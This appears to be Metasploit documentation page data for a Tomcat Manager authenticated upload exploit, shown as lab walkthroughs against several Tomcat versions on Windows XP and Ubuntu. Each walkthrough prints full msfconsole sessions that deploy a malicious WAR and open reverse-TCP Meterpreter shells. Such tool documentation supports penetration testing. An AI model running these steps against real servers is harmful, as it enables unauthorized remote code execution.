{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/multi/http/tomcat_mgr_upload","result":{"data":{"moduleMetadataJson":{"id":"021ba252-8a51-5886-8321-b926597ae1eb","name":"Apache Tomcat Manager Authenticated Upload Code Execution","fullname":"exploit/multi/http/tomcat_mgr_upload","description":"This module can be used to execute a payload on Apache Tomcat servers that\n        have an exposed \"manager\" application. The payload is uploaded as a WAR archive\n        containing a jsp application using a POST request against the /manager/html/upload\n        component.\n\n        NOTE: The compatible payload sets vary based on the selected target. For\n        example, you must select the Windows target to use native Windows payloads.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/multi/http/tomcat_mgr_upload","documentationSlug":"/modules/documentation/exploit/multi/http/tomcat_mgr_upload"},"documentation":{"html":"<h1 id=\"documentation-format\" style=\"position:relative;\"><a href=\"#documentation-format\" aria-label=\"documentation format permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Documentation Format</h1>\n<p>This documentation is slightly different from the standard module documentation due to the variation in variables/privileges/versions that can affect how exploitation happens.\nThis documentation is broken down by OS, Tomcat version, then privilege to show exploitation in each variation.</p>\n<h1 id=\"tomcatmgrdeploy\" style=\"position:relative;\"><a href=\"#tomcatmgrdeploy\" aria-label=\"tomcatmgrdeploy permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>tomcat<em>mgr</em>deploy</h1>\n<p>This module is VERY similar to <code class=\"language-text\">exploit/multi/http/tomcat_mgr_deploy</code>, the main difference is this uses a <code class=\"language-text\">POST</code> HTTP request through the GUI, instead of a <code class=\"language-text\">PUT</code> HTTP request.  This module also automatically undeploys (clean up) the malicious app.</p>\n<h2 id=\"windows-xp-sp2\" style=\"position:relative;\"><a href=\"#windows-xp-sp2\" aria-label=\"windows xp sp2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Windows (xp sp2)</h2>\n<h3 id=\"tomcat-6-6048\" style=\"position:relative;\"><a href=\"#tomcat-6-6048\" aria-label=\"tomcat 6 6048 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tomcat 6 (6.0.48)</h3>\n<h4 id=\"setup\" style=\"position:relative;\"><a href=\"#setup\" aria-label=\"setup permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Setup</h4>\n<ol>\n<li>Download and install the pre-req <a href=\"http://www.oracle.com/technetwork/java/javase/downloads/jre7-downloads-1880261.html\">Java7</a></li>\n<li>Download and install <a href=\"http://apache.osuosl.org/tomcat/tomcat-6/v6.0.48/bin/apache-tomcat-6.0.48.exe\">Tomcat6</a></li>\n</ol>\n<p>The install was default, other than adding a user during install.  No other options were changed.  The install assgined the new user the role <code class=\"language-text\">manager-gui</code>, which is Tomcat 7+ syntax.\nFor this exploitation, it was changed to simply <code class=\"language-text\">manager</code>.</p>\n<h4 id=\"exploitation\" style=\"position:relative;\"><a href=\"#exploitation\" aria-label=\"exploitation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Exploitation</h4>\n<ol>\n<li>\n<p>Edit <code class=\"language-text\">C:\\Program Files\\Apache Software Foundation\\Tomcat 6.0\\tomcat-users.xml</code> to add the following under the <code class=\"language-text\">&lt;tomcat-users&gt;</code> line:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">&lt;role rolename=&quot;manager&quot;/&gt;\n&lt;user username=&quot;tomcat&quot; password=&quot;tomcat&quot; roles=&quot;manager&quot;/&gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n</li>\n<li>Restart Tomcat service</li>\n<li>\n<p>Exploit:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploit/multi/http/tomcat_mgr_upload\nmsf exploit(tomcat_mgr_upload) &gt; set rport 8086\nrport =&gt; 8086\nmsf exploit(tomcat_mgr_upload) &gt; set HttpUsername tomcat\nHttpUsername =&gt; tomcat\nmsf exploit(tomcat_mgr_upload) &gt; set HttpPassword tomcat\nHttpPassword =&gt; tomcat\nmsf exploit(tomcat_mgr_upload) &gt; set rhost 192.168.2.108\nrhost =&gt; 192.168.2.108\nmsf exploit(tomcat_mgr_upload) &gt; set payload java/meterpreter/reverse_tcp \npayload =&gt; java/meterpreter/reverse_tcp\nmsf exploit(tomcat_mgr_upload) &gt; check\n[*] 192.168.2.108:8086 The target appears to be vulnerable.\nmsf exploit(tomcat_mgr_upload) &gt; set lhost 192.168.2.117\nlhost =&gt; 192.168.2.117\nmsf exploit(tomcat_mgr_upload) &gt; exploit\n\n[*] Started reverse TCP handler on 192.168.2.117:4444 \n[*] Retrieving session ID and CSRF token...\n[*] Uploading and deploying ZyCAK8R6vkZdD7d8n5fiLOpXEfPsq7...\n[*] Executing ZyCAK8R6vkZdD7d8n5fiLOpXEfPsq7...\n[*] Undeploying ZyCAK8R6vkZdD7d8n5fiLOpXEfPsq7 ...\n[*] Sending stage (49409 bytes) to 192.168.2.108\n[*] Meterpreter session 1 opened (192.168.2.117:4444 -&gt; 192.168.2.108:3387) at 2017-01-15 19:18:14 -0500\n\nmeterpreter &gt; sysinfo\nComputer    : winxp\nOS          : Windows XP 5.1 (x86)\nMeterpreter : java/windows</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n</li>\n</ol>\n<h3 id=\"tomcat-7-7073\" style=\"position:relative;\"><a href=\"#tomcat-7-7073\" aria-label=\"tomcat 7 7073 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tomcat 7 (7.0.73)</h3>\n<p>Of note, as of Tomcat 7, the permission role <code class=\"language-text\">manager</code> has been divided into several sub-roles.  The <code class=\"language-text\">manager-gui</code> permission is required for this exploit.</p>\n<h4 id=\"setup-1\" style=\"position:relative;\"><a href=\"#setup-1\" aria-label=\"setup 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Setup</h4>\n<ol>\n<li>Download and install the pre-req <a href=\"http://www.oracle.com/technetwork/java/javase/downloads/jre7-downloads-1880261.html\">Java7</a></li>\n<li>Download and install <a href=\"http://apache.osuosl.org/tomcat/tomcat-7/v7.0.73/bin/apache-tomcat-7.0.73.exe\">Tomcat7</a></li>\n</ol>\n<p>The install was default, other than adding a user during install.  No other options were changed.</p>\n<h4 id=\"exploitation-1\" style=\"position:relative;\"><a href=\"#exploitation-1\" aria-label=\"exploitation 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Exploitation</h4>\n<ol>\n<li>\n<p>If a user was not defined at install, you will need to add a <code class=\"language-text\">manager-gui</code> permission user.  Edit <code class=\"language-text\">C:\\Program Files\\Apache Software Foundation\\Tomcat 7.0\\tomcat-users.xml</code> to add the following under the <code class=\"language-text\">&lt;tomcat-users&gt;</code> line:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">&lt;role rolename=&quot;manager-gui&quot;/&gt;\n&lt;user username=&quot;tomcat&quot; password=&quot;tomcat&quot; roles=&quot;manager-gui&quot;/&gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n</li>\n<li>Restart the service if a user was added/changed</li>\n<li>\n<p>Exploitation:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploit/multi/http/tomcat_mgr_upload\nmsf exploit(tomcat_mgr_upload) &gt; set HttpUsername tomcat\nHttpUsername =&gt; tomcat\nmsf exploit(tomcat_mgr_upload) &gt; set HttpPassword tomcat\nHttpPassword =&gt; tomcat\nmsf exploit(tomcat_mgr_upload) &gt; set rhost 192.168.2.108\nrhost =&gt; 192.168.2.108\nmsf exploit(tomcat_mgr_upload) &gt; set payload java/meterpreter/reverse_tcp \npayload =&gt; java/meterpreter/reverse_tcp\nmsf exploit(tomcat_mgr_upload) &gt; set lhost 192.168.2.117\nlhost =&gt; 192.168.2.117\nmsf exploit(tomcat_mgr_upload) &gt; set rport 8087\nrport =&gt; 8087\nmsf exploit(tomcat_mgr_upload) &gt; check\n[*] 192.168.2.108:8087 The target appears to be vulnerable.\nmsf exploit(tomcat_mgr_upload) &gt; exploit\n\n[*] Started reverse TCP handler on 192.168.2.117:4444 \n[*] Retrieving session ID and CSRF token...\n[*] Uploading and deploying vm5yNsROSQ...\n[*] Executing vm5yNsROSQ...\n[*] Undeploying vm5yNsROSQ ...\n[*] Sending stage (49409 bytes) to 192.168.2.108\n[*] Meterpreter session 2 opened (192.168.2.117:4444 -&gt; 192.168.2.108:3427) at 2017-01-15 19:25:22 -0500\n\nmeterpreter &gt; sysinfo\nComputer    : winxp\nOS          : Windows XP 5.1 (x86)\nMeterpreter : java/windows</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n</li>\n</ol>\n<h3 id=\"tomcat-8-8039\" style=\"position:relative;\"><a href=\"#tomcat-8-8039\" aria-label=\"tomcat 8 8039 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tomcat 8 (8.0.39)</h3>\n<p>Of note, as of Tomcat 7, the permission role <code class=\"language-text\">manager</code> has been divided into several sub-roles.  The <code class=\"language-text\">manager-gui</code> permission is required for this exploit.</p>\n<h4 id=\"setup-2\" style=\"position:relative;\"><a href=\"#setup-2\" aria-label=\"setup 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Setup</h4>\n<ol>\n<li>Download and install the pre-req <a href=\"http://www.oracle.com/technetwork/java/javase/downloads/jre7-downloads-1880261.html\">Java7</a></li>\n<li>Download and install <a href=\"http://apache.osuosl.org/tomcat/tomcat-8/v8.0.39/bin/apache-tomcat-8.0.39.exe\">Tomcat8</a></li>\n</ol>\n<p>The install was default, other than adding a user during install.  No other options were changed.</p>\n<h4 id=\"exploitation-2\" style=\"position:relative;\"><a href=\"#exploitation-2\" aria-label=\"exploitation 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Exploitation</h4>\n<ol>\n<li>\n<p>If a user was not defined at install, you will need to add a <code class=\"language-text\">manager-gui</code> permission user.  Edit <code class=\"language-text\">C:\\Program Files\\Apache Software Foundation\\Tomcat 8.0\\tomcat-users.xml</code> to add the following under the <code class=\"language-text\">&lt;tomcat-users</code> line:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">&lt;role rolename=&quot;manager-gui&quot;/&gt;\n&lt;user username=&quot;tomcat&quot; password=&quot;tomcat&quot; roles=&quot;manager-gui&quot;/&gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n</li>\n<li>Restart the service if a user was added/changed</li>\n<li>\n<p>Exploitation:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploit/multi/http/tomcat_mgr_upload\nmsf exploit(tomcat_mgr_upload) &gt; set rport 8088\nrport =&gt; 8088\nmsf exploit(tomcat_mgr_upload) &gt; set HttpUsername tomcat\nHttpUsername =&gt; tomcat\nmsf exploit(tomcat_mgr_upload) &gt; set HttpPassword tomcat\nHttpPassword =&gt; tomcat\nmsf exploit(tomcat_mgr_upload) &gt; set rhost 192.168.2.108\nrhost =&gt; 192.168.2.108\nmsf exploit(tomcat_mgr_upload) &gt; set payload java/meterpreter/reverse_tcp \npayload =&gt; java/meterpreter/reverse_tcp\nmsf exploit(tomcat_mgr_upload) &gt; set lhost 192.168.2.117\nlhost =&gt; 192.168.2.117\nmsf exploit(tomcat_mgr_upload) &gt; set verbose true\nverbose =&gt; true\nmsf exploit(tomcat_mgr_upload) &gt; check\n\n[*] Tomcat Manager found running on win platform and x86 architecture\n[!] No active DB -- Credential data will not be saved!\n[*] 192.168.2.108:8088 The target appears to be vulnerable.\nmsf exploit(tomcat_mgr_upload) &gt; exploit\n\n[*] Started reverse TCP handler on 192.168.2.117:4444 \n[*] Retrieving session ID and CSRF token...\n[*] Finding CSRF token...\n[*] Uploading and deploying AiV6YUyTkEpIK5G87r0gmdf8fFH...\n[*] Uploading 6094 bytes as AiV6YUyTkEpIK5G87r0gmdf8fFH.war ...\n[*] Executing AiV6YUyTkEpIK5G87r0gmdf8fFH...\n[*] Executing /AiV6YUyTkEpIK5G87r0gmdf8fFH/u9TOPpZzy6dj21L.jsp...\n[*] Finding CSRF token...\n[*] Undeploying AiV6YUyTkEpIK5G87r0gmdf8fFH ...\n[*] Sending stage (49409 bytes) to 192.168.2.108\n[*] Meterpreter session 1 opened (192.168.2.117:4444 -&gt; 192.168.2.108:3508) at 2017-01-15 19:38:29 -0500\n\nmeterpreter &gt; sysinfo\nComputer    : winxp\nOS          : Windows XP 5.1 (x86)\nMeterpreter : java/windows</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n</li>\n</ol>\n<h2 id=\"linux\" style=\"position:relative;\"><a href=\"#linux\" aria-label=\"linux permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Linux</h2>\n<h3 id=\"tomcat6-6039---ubuntu-server-1404-64bit\" style=\"position:relative;\"><a href=\"#tomcat6-6039---ubuntu-server-1404-64bit\" aria-label=\"tomcat6 6039   ubuntu server 1404 64bit permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tomcat6 (6.0.39) - Ubuntu server 14.04 64bit</h3>\n<h4 id=\"setup-3\" style=\"position:relative;\"><a href=\"#setup-3\" aria-label=\"setup 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Setup</h4>\n<ol>\n<li>Install Tomcat and dependencies: <code class=\"language-text\">sudo apt-get install tomcat6 tomcat6-admin</code></li>\n</ol>\n<h4 id=\"exploit\" style=\"position:relative;\"><a href=\"#exploit\" aria-label=\"exploit permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Exploit</h4>\n<ol>\n<li>\n<p>Edit <code class=\"language-text\">/etc/tomcat6/tomcat-users.xml</code> to add the following:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">&lt;role rolename=&quot;manager&quot;/&gt;\n&lt;user username=&quot;tomcat&quot; password=&quot;tomcat&quot; roles=&quot;manager&quot;/&gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n</li>\n<li>Restart the service if a user was added/changed: <code class=\"language-text\">sudo service tomcat6 restart</code></li>\n<li>\n<p>Exploit:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploit/multi/http/tomcat_mgr_upload\nmsf exploit(tomcat_mgr_upload) &gt; set HttpUsername tomcat\nHttpUsername =&gt; tomcat\nmsf exploit(tomcat_mgr_upload) &gt; set HttpPassword tomcat\nHttpPassword =&gt; tomcat\nmsf exploit(tomcat_mgr_upload) &gt; set payload java/meterpreter/reverse_tcp \npayload =&gt; java/meterpreter/reverse_tcp\nmsf exploit(tomcat_mgr_upload) &gt; set verbose true\nverbose =&gt; true\nmsf exploit(tomcat_mgr_upload) &gt; set lhost 192.168.2.117\nlhost =&gt; 192.168.2.117\nmsf exploit(tomcat_mgr_upload) &gt; set rhost 192.168.2.156\nrhost =&gt; 192.168.2.156\nmsf exploit(tomcat_mgr_upload) &gt; set rport 8080\nrport =&gt; 8080\nmsf exploit(tomcat_mgr_upload) &gt; check\n\n[*] Tomcat Manager found running on linux platform and x64 architecture\n[!] No active DB -- Credential data will not be saved!\n[*] 192.168.2.156:8080 The target appears to be vulnerable.\nmsf exploit(tomcat_mgr_upload) &gt; exploit\n\n[*] Started reverse TCP handler on 192.168.2.117:4444 \n[*] Retrieving session ID and CSRF token...\n[*] Finding CSRF token...\n[*] Uploading and deploying biytXntmq4Dtie0ulwwT...\n[*] Uploading 6082 bytes as biytXntmq4Dtie0ulwwT.war ...\n[!] No active DB -- Credential data will not be saved!\n[*] Executing biytXntmq4Dtie0ulwwT...\n[*] Executing /biytXntmq4Dtie0ulwwT/rmslIdWH4LwPZlMkHipzUah.jsp...\n[*] Finding CSRF token...\n[*] Undeploying biytXntmq4Dtie0ulwwT ...\n[*] Sending stage (49409 bytes) to 192.168.2.156\n[*] Meterpreter session 1 opened (192.168.2.117:4444 -&gt; 192.168.2.156:55062) at 2017-01-15 20:29:42 -0500\n\nmeterpreter &gt; sysinfo\nComputer    : Ubuntu14\nOS          : Linux 4.2.0-27-generic (amd64)\nMeterpreter : java/linux</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 